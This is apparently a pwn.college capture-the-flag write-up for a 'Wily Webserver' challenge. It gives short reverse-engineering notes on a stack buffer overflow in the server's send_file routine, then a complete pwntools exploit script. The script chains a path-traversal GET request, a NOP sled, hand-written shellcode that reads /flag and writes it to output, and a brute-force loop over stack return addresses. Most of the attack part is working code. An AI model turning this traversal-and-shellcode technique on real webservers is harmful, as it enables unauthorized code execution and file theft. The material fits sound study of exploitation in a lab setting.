# Wily Webserver

#### Disas main and find challenge. Inside challenge there is handle_connection. Inside handle_connection there is send_file. So far need to send a GET request for a file in the challenge folder.
```asm
0x0000000000401dff <+99>:    call   0x401c54 <challenge>
0x0000000000401d8b <+311>:   call   0x401925 <handle_connection>
0x0000000000401c4d <+808>:   call   0x4014e7 <send_file>
```
```gdb
(gdb) x/s 0x402213
0x402213:       "GET"
(gdb) x/s 0x402226
0x402226:       "HTTP/1.1"
(gdb) x/s 0x40222f
0x40222f:       "/challenge/files/%s"
```
------------------------------------------------------------------

#### Find the buffer offset here in send_file, 0x2010(8208). It checks for a file and makes sure it is less than 0x1fff(8191) and sets up the buffer read. This is where the exploit happens, it loads the header AFTER it checks the file size.
```asm
0x000000000040151b <+52>:    lea    -0x2010(%rbp),%rax
0x00000000004015be <+215>:   cmp    $0x8000,%eax
0x0000000000401603 <+284>:   cmp    $0x1fff,%rax
0x0000000000401642 <+347>:   mov    -0x2010(%rbp),%rax
0x0000000000401649 <+354>:   lea    0xaa8(%rip),%rsi        # 0x4020f8
0x0000000000401658 <+369>:   call   0x4012e0 <sprintf@plt>
(gdb) x/s 0x4020f8
0x4020f8:       "HTTP/1.1 200 OK\nServer: pwnserver/1.", '3' <repeats 83 times>, ".7\nX-Leetness-Level: 9001\nContent-type: "
```
-------------------------------------------------------------------

#### Just need to craft the script to do 2 things. First it needs to get the header length and then use that to craft the actual file to overflow the buffer. I had to add FD 3 to the assembly in order to print the flag, not really sure why. Rather than hunt an address down, just loop through but happened to land exactly on the first iteration:
```python
from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

def shell():
    asmbl = """
    xor rsi, rsi
    push rsi
    mov rdi, 0x67616c662f
    push rdi
    mov rdi, rsp
    push 2
    pop rax
    xor rdx, rdx
    syscall
    
    push 1
    pop rdi
    mov rsi, rax
    xor r10, r10
    mov r10w, 1000
    push 40
    pop rax
    xor rdx, rdx
    syscall

    push 3
    pop rdi
    mov rsi, rax
    xor r10, r10
    mov r10w, 1000
    push 40
    pop rax
    xor rdx, rdx
    syscall

    push 60
    pop rax
    syscall
    """
    sc = asm(asmbl)
    buff = 6000

    for addr in range(0x7fffffffa000, 0x7ffffffff000, 100):
        try:
            ws = process(['/challenge/integration-web-overflow'])

            with open('/tmp/hl.bin', 'wb') as f:
                f.write(b'A'*8000)

            iw = remote('localhost', 80)
            iw.send(b'GET /../../../../../tmp/hl.bin HTTP/1.1 \r\n\r\n')
            r = iw.recvall(timeout=.1)
                
            h_len = len(r.split(b'\n\n')[0]) + 2
            pad = buff - h_len - len(sc)

            hack = b'\x90' * pad + sc
            hack += p64(addr + h_len + (pad // 2))
            
            with open('/tmp/hack.bin', 'wb') as f:
                f.write(hack)

            iw = remote('localhost', 80)
            iw.send(b'GET /../../../../../tmp/hack.bin HTTP/1.1 \r\n\r\n')
            net = iw.recvall(timeout=.1)
            
            out = ws.recvall(timeout=.1)
            
            if b'pwn.college' in out:
                print(f'\nFlag found at: {hex(addr)}')
                print(out.decode(errors='ignore'))
                break
            else:
                print(f'\rScanning: {hex(addr)}', end='')
                
        except Exception:
            pass

if __name__ == '__main__':
    shell()
